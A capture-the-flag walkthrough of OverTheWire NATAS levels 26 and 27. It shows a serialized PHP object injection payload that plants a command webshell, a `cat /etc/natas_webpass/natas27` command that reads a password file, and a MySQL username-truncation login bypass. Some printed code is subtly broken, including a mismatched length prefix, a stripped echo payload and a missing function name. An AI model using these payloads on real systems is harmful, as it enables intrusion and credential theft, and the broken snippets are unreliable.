---
title: 'OverTheWire: NATAS 26 &#8211; 27'
date: 2019-09-19T14:40:12-04:00
categories: [Walkthrough, OverTheWire]
tags: [web]
---
### LEVEL 26

<img class="alignnone size-full wp-image-294" src="/assets/img/2019/09/2019-09-19_13h59_59.png" /> 

The sourcecode:

{% highlight php %}
<?php
  // sry, this is ugly as hell.
  // cheers kaliman ;)
  // - morla
  
  class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
   
    function __construct($file){
      // initialise variables
      $this->initMsg="#--session started--#\n";
      $this->exitMsg="#--session end--#\n";
      $this->logFile = "/tmp/natas26_" . $file . ".log";
   
      // write initial message
      $fd=fopen($this->logFile,"a+");
      fwrite($fd,$initMsg);
      fclose($fd);
    }            
   
    function log($msg){
      $fd=fopen($this->logFile,"a+");
      fwrite($fd,$msg."\n");
      fclose($fd);
    }            
   
    function __destruct(){
      // write exit message
      $fd=fopen($this->logFile,"a+");
      fwrite($fd,$this->exitMsg);
      fclose($fd);
    }            
  }
 
  function showImage($filename){
    if(file_exists($filename))
      echo "<img src=\"$filename\">";
  }

  function drawImage($filename){
    $img=imagecreatetruecolor(400,300);
    drawFromUserdata($img);
    imagepng($img,$filename);   
    imagedestroy($img);
  }
  
  function drawFromUserdata($img){
    if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
      array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
    
      $color=imagecolorallocate($img,0xff,0x12,0x1c);
      imageline($img,$_GET["x1"], $_GET["y1"], 
              $_GET["x2"], $_GET["y2"], $color);
    }
    
    if (array_key_exists("drawing", $_COOKIE)){
      $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
      if($drawing)
        foreach($drawing as $object)
          if( array_key_exists("x1", $object) && 
            array_key_exists("y1", $object) &&
            array_key_exists("x2", $object) && 
            array_key_exists("y2", $object)){
          
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$object["x1"],$object["y1"],
                $object["x2"] ,$object["y2"] ,$color);
      
          }
    }  
  }
  
  function storeData(){
    $new_object=array();

    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
      array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
      $new_object["x1"]=$_GET["x1"];
      $new_object["y1"]=$_GET["y1"];
      $new_object["x2"]=$_GET["x2"];
      $new_object["y2"]=$_GET["y2"];
    }
    
    if (array_key_exists("drawing", $_COOKIE)){
      $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    }
    else{
      // create new array
      $drawing=array();
    }
    
    $drawing[]=$new_object;
    setcookie("drawing",base64_encode(serialize($drawing)));
  }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form> 

<?php
  session_start();

  if (array_key_exists("drawing", $_COOKIE) ||
    (  array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
      array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){ 
    $imgfile="img/natas26_" . session_id() .".png"; 
    drawImage($imgfile); 
    showImage($imgfile);
    storeData();
  }
  
?>
{% endhighlight %}

Whew! So much code&#8230; the levels are getting real good now!

From reviewing the code, it looks like the vulnerability is PHP OBJECT INJECTION via the unserialize() call. According to [OWASP](https://www.owasp.org/index.php/PHP_Object_Injection) on the nature of this vulnerability, we should be able to use the unserialize() call to overwrite &#8216;Logger => exitMsg&#8217;. When the page calls Logger.__destruct() method, our modified exitMsg will be saved into the log file. We should then be able to open the log file and get a stored XSS to read out the password.

We need to know the [structure](https://stackoverflow.com/questions/14297926/structure-of-a-serialized-php-string) of serialized data pretty well to make our own. Once base64 decoded, an example of serialized data from this page is:

{% highlight php %}
a:1:{
  i:0;a:4:{
    s:2:"x1";
    s:1:"1";
    s:2:"y1";
    s:1:"2";
    s:2:"x2";
    s:1:"3";
    s:2:"y2";
    s:1:"4";
  }
}
{% endhighlight %}

Since we actually can control the &#8216;$logFile&#8217; variable as well as &#8216;$exitMsg&#8217;, we can change the log file into a php file, and make a webshell for executing commands!

An example of serialized data for a request that manipulates both variables:

{% highlight php %}
a:1:{
  i:0;
  O:6:"Logger":2:{
    s:15:"\0Logger\0logFile";
    s:31:"img/natas26_ponderngnatas26.php";
    s:15:"\0Logger\0exitMsg";
    s:21:"<pre> <?=`$_GET[1]`?>";
  }
}
{% endhighlight %}

Here the structure I need to explain is the &#8220;O&#8221;, which means the Object type.

> Objects are serialized as:
> 
> `O:<i>:"<s>":<i>:{<properties>}`
> 
> where the first `<i>` is an integer representing the string length of `<s>`, and `<s>` is the fully qualified class name (class name prepended with full namespace). The second `<i>` is an integer representing the number of object properties. `<properties>` are zero or more serialized name value pairs:
> 
> <span class="lang:php decode:true crayon-inline "><name><value></span>
> 
> where `<name>` is a serialized string representing the property name, and `<value>` any value that is serializable.

Our first pair is

{% highlight php %}
s:15:"\0Logger\0logFile";
s:31:"img/natas26_randomname.php";
{% endhighlight %}

and second pair is

{% highlight php %}
s:15:"\0Logger\0exitMsg";
s:21:"<pre> <?=`$_GET[1]`?>";
{% endhighlight %}

That will create a php at &#8220;/img/natas26_randomname.php&#8221; with a small webshell that reads our commands from the GET request as &#8220;/?1={cmd}&#8221;.

Taking out the tabs and doing a base64 encoding will result in "YToxOntpOjA7Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNjoiaW1nL25hdGFzMjZfcmFuZG9tbmFtZS5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czoyMToiPHByZT4gPD89YCRfR0VUWzFdYD8%2bIjt9fQ=="

It should be noted that the variable names in our serialized data have null bytes included because they are private variables, and that&#8217;s how they have to be represented. Per [stackoverflow](https://stackoverflow.com/questions/14297926/structure-of-a-serialized-php-string):

> `<name>` is represented as
> 
> `s:<i>:"<s>";`
> 
> where `<i>` is an integer representing the string length of `<s>`. But the values of `<s>` differs per visibility of properties:
> 
> a. With **public** properties `<s>` is the simple name of the property.
> 
> b. With **protected** properties, however, `<s>` is the simple name of the property, prepended with `\0*\0` — an asterix, enclosed in two `NUL` characters (i.e. `chr(0)`).
> 
> c. And with **private** properties, `<s>` is the simple name of the property, prepended with `\0<s>\0` — `<s>`, enclosed in two `NUL` characters, where `<s>` is the fully qualified class name.

There&#8217;s a couple of ways to get the NUL values encoded correctly. You could use a hex editor like &#8220;010 Editor&#8221; if you&#8217;re on Windows.  
Or if you&#8217;re on linux, use `echo -n -e ‘a:1:{i:0;O:6:”Logger”:2:s:15:”\0Logger\0logFile”;s:26:”img/natas26_randomname.php”;s:15:”\0Logger\0exitMsg”;s:21:”<pre> ”;}}’ | base64`

That&#8217;s it! Try it with the command `/?1=cat+/etc/natas_webpass/natas27`.

&nbsp;

### LEVEL 27

<img class="alignnone size-full wp-image-301" src="/assets/img/2019/09/2019-09-20_08h50_15.png" /> 

The sourcecode:

{% highlight php %}<?

// morla / 10111
// database gets cleared every 5 min 


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){
 
  $user=mysql_real_escape_string($usr);
  $password=mysql_real_escape_string($pass);
  
  $query = "SELECT username from users where username='$user' and password='$password' ";
  $res = mysql_query($query, $link);
  if(mysql_num_rows($res) > 0){
    return True;
  }
  return False;
}


function validUser($link,$usr){
  
  $user=mysql_real_escape_string($usr);
  
  $query = "SELECT * from users where username='$user'";
  $res = mysql_query($query, $link);
  if($res) {
    if(mysql_num_rows($res) > 0) {
      return True;
    }
  }
  return False;
}


function dumpData($link,$usr){
  
  $user=mysql_real_escape_string($usr);
  
  $query = "SELECT * from users where username='$user'";
  $res = mysql_query($query, $link);
  if($res) {
    if(mysql_num_rows($res) > 0) {
      while ($row = mysql_fetch_assoc($res)) {
        // thanks to Gobo for reporting this bug! 
        //return print_r($row);
        return print_r($row,true);
      }
    }
  }
  return False;
}


function createUser($link, $usr, $pass){

  $user=mysql_real_escape_string($usr);
  $password=mysql_real_escape_string($pass);
  
  $query = "INSERT INTO users (username,password) values ('$user','$password')";
  $res = mysql_query($query, $link);
  if(mysql_affected_rows() > 0){
    return True;
  }
  return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
  $link = mysql_connect('localhost', 'natas27', '<censored>');
  mysql_select_db('natas27', $link);
  

  if(validUser($link,$_REQUEST["username"])) {
    //user exists, check creds
    if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
      echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
      echo "Here is your data:<br>";
      $data= ($link,$_REQUEST["username"]);
      print htmlentities($data);
    }
    else{
      echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
    }    
  } 
  else {
    //user doesn't exist
    if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
      echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
    }
  }

  mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<? } ?>
{% endhighlight %}

This level has another username/password form request to break. It first checks to see if there are any users with the username provided, and if there is, it validates the credentials. Otherwise, it creates a user with the credentials provided. After a successful login, the credentials are printed out from an array:

<img class="alignnone size-full wp-image-302" src="/assets/img/2019/09/2019-09-20_09h19_05.png" /> 

I thought this would end up being a SQL injection challenge since there are so many SQL queries in the source, but after a little experimentation and closer inspection of the code it became apparent that is not. All of the user inputs for the SQL queries are sanitized with mysql\_real\_escape\_string(). Also, XSS is blocked by all of the outputs being sanitized by htmlentities(). This code seems pretty secure and I went down several rabbit-holes trying to figure out where the weakness is. Even studied getting around mysql\_real\_escape\_string() with encoding errors, but that doesn&#8217;t apply here. It is kind of obvious the challenge is supposed to be solved by tricking the dumpData() function into dumping &#8220;natas28&#8221;.

Eventually I had to cheat (I know, I know it&#8217;s crappy). The solution I found is really quite clever and I feel dumb for not seeing it and in the future I&#8217;ll remember that feeling when considering to cheat or not.

Turns out there are a couple of weaknesses that when exploited together can bypass the login.

Firstly, dumpData() has a &#8216;while&#8217; statement that allows dumping of multiple users if they are in the SQL result. Under normal operations that wouldn&#8217;t happen.

Secondly, MySQL doesn&#8217;t count trailing spaces when doing a comparison.

Thirdly, we can send a username to createUser() that is longer than the 64 bytes given to the &#8216;username&#8217; field and it will be truncated, but accepted.

Putting that together, we can get createUser() to create one with a username of natas28 with a bunch of spaces appended to it, so it will pass the validUser() comparison. The last character can&#8217;t be a space because we need the first validUser() check to fail, so it will create our exploit user. The length of the username has to be greater than 64 bytes, so the last character (that isn&#8217;t a space) will be truncated and the end result in the database will seem to be &#8220;natas28&#8221; to the comparisons. Then login with &#8220;natas28&#8221; and the password sent to createUser().

Here is an example:

Create the username with `python -c “print(‘natas28’ + ‘+’*57 + ‘1’)”` and login.  
<img class="alignnone wp-image-304 size-full" src="/assets/img/2019/09/2019-09-23_12h48_08.png" /> 

And the login:

<img class="alignnone wp-image-330 size-full" src="/assets/img/2019/09/2019-09-26_12h48_18.png" />